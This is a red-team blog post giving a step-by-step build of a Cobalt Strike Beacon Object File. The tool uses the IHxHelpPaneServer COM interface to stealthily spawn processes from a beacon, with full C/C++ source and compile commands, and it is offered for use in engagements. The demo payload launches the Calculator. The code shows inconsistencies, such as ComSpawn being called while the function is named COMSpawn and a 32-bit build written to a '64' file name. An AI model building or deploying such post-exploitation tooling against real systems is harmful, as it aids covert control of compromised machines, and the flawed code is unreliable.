---
layout: post
title: COM Process Spawner BOF
date: 2025-01-16 00:05:00 +0100
categories:
  - Red Team
  - Malware
author: kuom
---
This guide focuses on developing a Cobalt Strike Beacon Object File (BOF) for creating a COM (Component Object Model) process spawner.

This technique is useful during engagements for session passing and enabling the execution of multiple beacons simultaneously.

The main idea is to stealthily spawn a process in the current context using a legitimate Windows COM interface, `IHxHelpPaneServer`.
### Prerequisites Knowledge
A [Beacon Object File](https://hstechdocs.helpsystems.com/manuals/corects/impact/current/userguide/content/topics/appx_bof.htm) is a compiled C program written to a convention that allows it to execute within an agent process and use internal agent APIs. 
BOFs are a way to rapidly extend the Cobalt Strike agent with new post-exploitation features.

The [Microsoft Component Object Model](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact.
### Setting up the environment
There is a nice [Visual Studio BOF template](https://github.com/Cobalt-Strike/bof-vs) to easily develop BOFs.

Download the zip archive from GitHub and put it into `%USERPROFILE%\Documents\Visual Studio 2022\Templates\ProjectTemplates`. 
Now we can choose the BOF template from Visual Studio.
### Creating the BOF
For the creation of this BOF I found inspiration from this [PoC]( https://github.com/vxunderground/VXUG-Papers/blob/main/Stealthily%20Creating%20Processes/IHxHelpPaneServer.cpp.) from VX Underground.
Shoutout to them and to the author.

We start including needed headers file and by declaring actions to do on Debug case.
````
#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT  
#define DECLSPEC_IMPORT
#endif
````

C++ linkage mangles function names, which can prevent a Beacon Object File's (BOF) entry point from being correctly invoked. Using `extern "C"` ensures the functions contained in the curly braces have C linkage, avoiding these issues.

We then use the [DFR (Dynamic Function Resolution)](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_dynamic-func-resolution.htm) convention to declare and call the Win32 APIs that we need in the code: in this case, `LoadLibraryA` and `GetLastError` are needed to load the `OLE32.dll` in order to use functions to deal with COM objects. 
````
extern "C" {
#include "beacon.h"
    DFR(KERNEL32, LoadLibraryA);
    #define LoadLibraryA KERNEL32$LoadLibraryA
    DFR(KERNEL32, GetLastError);
    #define GetLastError KERNEL32$GetLastError
````

We define the `IHxHelpPaneServer` interface.
````
    struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
        IHxHelpPaneServer : public IUnknown {
        virtual HRESULT __stdcall DisplayTask(PWCHAR) = 0;
        virtual HRESULT __stdcall DisplayContents(PWCHAR) = 0;
        virtual HRESULT __stdcall DisplaySearchResults(PWCHAR) = 0;
        virtual HRESULT __stdcall Execute(const PWCHAR) = 0;
    };
````

We define a function to convert HRESULT to Win32 error code.
````
    DWORD Win32FromHResult(HRESULT Result) {
        if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
            return HRESULT_CODE(Result);

        if (Result == S_OK)
            return ERROR_SUCCESS;

        return ERROR_CAN_NOT_COMPLETE;
    }
````

We define wrapper functions for accessing standard COM functions like `CoInitializeEx`, `CoCreateInstance`, `CLSIDFromString`, and `CoUninitialize`. 

They are designed to dynamically load the `OLE32.dll` library using `LoadLibraryA` (instead of relying on a static library load) and to retrieve the addresses of the necessary functions using `GetProcAddress`. 

In particular:
- `CoInitializeEx` -> initializes the COM library
- `CoCreateInstance` -> creates an instance of a COM object
- `CLSIDFromString` -> converts string into Class ID, needed to create COM objects
- `CoUninitialize` -> uninitializes the COM library

```
	HRESULT MyCoInitializeEx(LPVOID pvReserved, DWORD dwCoInit) {
        typedef HRESULT(WINAPI* pCoInitializeEx)(LPVOID, DWORD);
        static pCoInitializeEx fnCoInitializeEx = nullptr;

        if (!fnCoInitializeEx) {
            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
            if (!hOle32) {
                return HRESULT_FROM_WIN32(GetLastError());
            }

            fnCoInitializeEx = (pCoInitializeEx)GetProcAddress(hOle32, "CoInitializeEx");
            if (!fnCoInitializeEx) {
                return HRESULT_FROM_WIN32(GetLastError());
            }
        }

        return fnCoInitializeEx(pvReserved, dwCoInit);
    }

    HRESULT MyCoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv) {
        typedef HRESULT(WINAPI* pCoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
        static pCoCreateInstance fnCoCreateInstance = nullptr;

        if (!fnCoCreateInstance) {
            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
            if (!hOle32) {
                return HRESULT_FROM_WIN32(GetLastError());
            }

            fnCoCreateInstance = (pCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
            if (!fnCoCreateInstance) {
                return HRESULT_FROM_WIN32(GetLastError());
            }
        }

        return fnCoCreateInstance(rclsid, pUnkOuter, dwClsContext, riid, ppv);
    }

    HRESULT MyCLSIDFromString(LPCWSTR lpsz, LPCLSID pclsid) {
        typedef HRESULT(WINAPI* pCLSIDFromString)(LPCWSTR, LPCLSID);
        static pCLSIDFromString fnCLSIDFromString = nullptr;

        if (!fnCLSIDFromString) {
            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
            if (!hOle32) {
                return HRESULT_FROM_WIN32(GetLastError());
            }

            fnCLSIDFromString = (pCLSIDFromString)GetProcAddress(hOle32, "CLSIDFromString");
            if (!fnCLSIDFromString) {
                return HRESULT_FROM_WIN32(GetLastError());
            }
        }

        return fnCLSIDFromString(lpsz, pclsid);
    }

    void MyCoUninitialize() {
        typedef void(WINAPI* pCoUninitialize)();
        static pCoUninitialize fnCoUninitialize = nullptr;

        if (!fnCoUninitialize) {
            HMODULE hOle32 = LoadLibraryA("OLE32.dll");
            if (!hOle32) {
                return;
            }

            fnCoUninitialize = (pCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
            if (!fnCoUninitialize) {
                return;
            }
        }

        fnCoUninitialize();
    }
```

We define a function to initialize the CLSID and IID identifiers associated with the `IHxHelpPaneServer` interface. 

It uses the `MyCLSIDFromString` function to obtain these identifiers from predefined GUID strings.
```
    HRESULT CoInitializeIHxHelpIds(LPGUID Clsid, LPGUID Iid) {
        HRESULT Result = S_OK;

        if (!SUCCEEDED(Result = MyCLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
            return Result;

        if (!SUCCEEDED(Result = MyCLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
            return Result;

        return Result;
    }
```

The `ComSpawn` function sets up the COM interface by initializing the necessary identifiers and then creates an instance of the `IHxHelpPaneServer` object. 

It performs an operation on the object, in this case launching `CALC.EXE` (chosen because the Windows Calculator is commonly found on many Windows installations). 

Afterward, it releases the object and uninitializes the COM library. 

The `go` function is the entry point of the program and simply calls `ComSpawn` to execute the logic described above.
```
DWORD COMSpawn() {
        HRESULT Result = S_OK;
        GUID CLSID_IHxHelpPaneServer;
        GUID IID_IHxHelpPaneServer;
        WCHAR pcUrl[256] = L"file:///C:/WINDOWS/SYSTEM32/CALC.EXE";
        IHxHelpPaneServer* Help = nullptr;

        if (!SUCCEEDED(Result = CoInitializeIHxHelpIds(&CLSID_IHxHelpPaneServer, &IID_IHxHelpPaneServer))) {
            return Win32FromHResult(Result);
        }

        if (!SUCCEEDED(Result = MyCoInitializeEx(NULL, COINIT_MULTITHREADED))) {
            return Win32FromHResult(Result);
        }

        if (!SUCCEEDED(Result = MyCoCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL, IID_IHxHelpPaneServer, (PVOID*)&Help))) {
            MyCoUninitialize();
            return Win32FromHResult(Result);
        }

        Result = Help->Execute(pcUrl);
        if (FAILED(Result)) {
        }
        else {
        }

        if (Help)
            Help->Release();

        MyCoUninitialize();
        return Win32FromHResult(Result);
    }

    void go(char* args, int len) {
        ComSpawn();
    }
}
```

### Testing the BOF
As mentioned earlier, the Visual Studio BOF template makes it easy to test and debug BOFs directly within the IDE, removing the need for external tools.

We can simply press the Debug button to test our BOF, and it's a good idea to test both the x64 and x86 versions to ensure compatibility across different architectures.
![](/assets/com-spawner1.png)
### Building the BOF
We compile the object file using mingw32-gcc for 64 bit
```
x86_64-w64-mingw32-gcc -c COMSpawn.cpp -o COMSpawn64.o
```
And using the -m32 flag for 32 bit
```
x86_64-w64-mingw32-gcc -c -m32 COMSpawn.cpp -o COMSpawn64.o
```
After that, we test them using TrustedSec's COFFLoader, a tool designed to load and execute BOF; this allows us to test the functionality of the compiled BOFs in a controlled environment.

A nice read to [learn more about COFF](https://otterhacker.github.io/Malware/CoffLoader.html#compatibility-with-cobaltstrike-bof).
![](/assets/com-spawner2.png)
We can now test it within Cobalt Strike itself.

Feel free to utilize this with Cobalt Strike and extend its functionality. 

Currently, I’m developing a new BOF, this time using the `IStandartActivator` COM interface, to facilitate process spawning in alternate sessions instead of the active one.
#### [Full snippet on GitHub](https://github.com/ohkuom/IHxHelpPaneServerBOF/)
